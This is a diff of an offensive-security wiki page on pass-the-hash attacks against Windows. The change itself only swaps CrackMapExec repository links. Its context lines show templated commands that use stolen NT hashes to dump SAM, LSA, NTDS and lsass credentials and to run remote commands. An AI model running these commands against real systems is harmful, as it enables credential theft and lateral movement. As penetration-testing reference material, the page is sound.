@@ -10,7 +10,7 @@ An attacker knowing a user's NT hash can use it to authenticate over NTLM (pass-
 
 ## Practice
 
-There are many tools that implement pass-the-hash: [Impacket scripts](https://github.com/SecureAuthCorp/impacket) (Python) ([psexec](https://github.com/SecureAuthCorp/impacket/blob/master/examples/psexec.py), [smbexec](https://github.com/SecureAuthCorp/impacket/blob/master/examples/smbexec.py), [secretsdump](https://github.com/SecureAuthCorp/impacket/blob/master/examples/secretsdump.py)...), [CrackMapExec](https://github.com/byt3bl33d3r/CrackMapExec) (Python), [FreeRDP](https://github.com/FreeRDP/FreeRDP) (C), [mimikatz](https://github.com/gentilkiwi/mimikatz) (C), [lsassy](https://github.com/Hackndo/lsassy) (Python), [pth-toolkit](https://github.com/byt3bl33d3r/pth-toolkit) (Python) and many more.
+There are many tools that implement pass-the-hash: [Impacket scripts](https://github.com/SecureAuthCorp/impacket) (Python) ([psexec](https://github.com/SecureAuthCorp/impacket/blob/master/examples/psexec.py), [smbexec](https://github.com/SecureAuthCorp/impacket/blob/master/examples/smbexec.py), [secretsdump](https://github.com/SecureAuthCorp/impacket/blob/master/examples/secretsdump.py)...), [CrackMapExec](https://github.com/mpgn/CrackMapExec) (Python), [FreeRDP](https://github.com/FreeRDP/FreeRDP) (C), [mimikatz](https://github.com/gentilkiwi/mimikatz) (C), [lsassy](https://github.com/Hackndo/lsassy) (Python), [pth-toolkit](https://github.com/byt3bl33d3r/pth-toolkit) (Python) and many more.
 
 {% tabs %}
 {% tab title="Credentials dumping" %}
@@ -22,7 +22,7 @@ secretsdump.py -hashes ':NThash' 'DOMAIN/USER@TARGET'
 secretsdump.py 'DOMAIN/USER:PASSWORD@TARGET'
 ```
 
-[CrackMapExec](https://github.com/byt3bl33d3r/CrackMapExec) (Python) has the ability to do it on a set of targets. The `bh_owned` has the ability to set targets as "owned" in [BloodHound](https://github.com/BloodHoundAD/BloodHound) (see [dumping credentials from registry hives](../credentials/dumping/#windows-computer-registry-hives)).
+[CrackMapExec](https://github.com/mpgn/CrackMapExec) (Python) has the ability to do it on a set of targets. The `bh_owned` has the ability to set targets as "owned" in [BloodHound](https://github.com/BloodHoundAD/BloodHound) (see [dumping credentials from registry hives](../credentials/dumping/#windows-computer-registry-hives)).
 
 ```bash
 crackmapexec smb $TARGETS -u $USER -H $NThash --sam --local-auth
@@ -30,7 +30,7 @@ crackmapexec smb $TARGETS -d $DOMAIN -u $USER -H $NThash --lsa
 crackmapexec smb $TARGETS -d $DOMAIN -u $USER -H $NThash --ntds
 ```
 
-[Lsassy](https://github.com/Hackndo/lsassy) (Python) has the ability to do it with higher success probabilities as it offers multiple dumping methods. This tool can set targets as "owned" in [BloodHound](https://github.com/BloodHoundAD/BloodHound). It works in standalone but also as a [CrackMapExec](https://github.com/byt3bl33d3r/CrackMapExec) module (see [dumping credentials from lsass process memory](../credentials/dumping/#windows-computer-lsass-exe)).
+[Lsassy](https://github.com/Hackndo/lsassy) (Python) has the ability to do it with higher success probabilities as it offers multiple dumping methods. This tool can set targets as "owned" in [BloodHound](https://github.com/BloodHoundAD/BloodHound). It works in standalone but also as a [CrackMapExec](https://github.com/mpgn/CrackMapExec) module (see [dumping credentials from lsass process memory](../credentials/dumping/#windows-computer-lsass-exe)).
 
 ```bash
 crackmapexec smb $TARGETS -d $DOMAIN -u $USER -H $NThash -M lsassy
@@ -51,7 +51,7 @@ atexec.py -hashes 'LMhash:NThash' 'DOMAIN/USER@TARGET'
 dcomexec.py -hashes 'LMhash:NThash' 'DOMAIN/USER@TARGET'
 ```
 
-[CrackMapExec](https://github.com/byt3bl33d3r/CrackMapExec) (Python) has the ability to do it on a set of targets
+[CrackMapExec](https://github.com/mpgn/CrackMapExec) (Python) has the ability to do it on a set of targets
 
 ```bash
 crackmapexec winrm $TARGETS -d $DOMAIN -u $USER -p $PASSWORD -x whoami
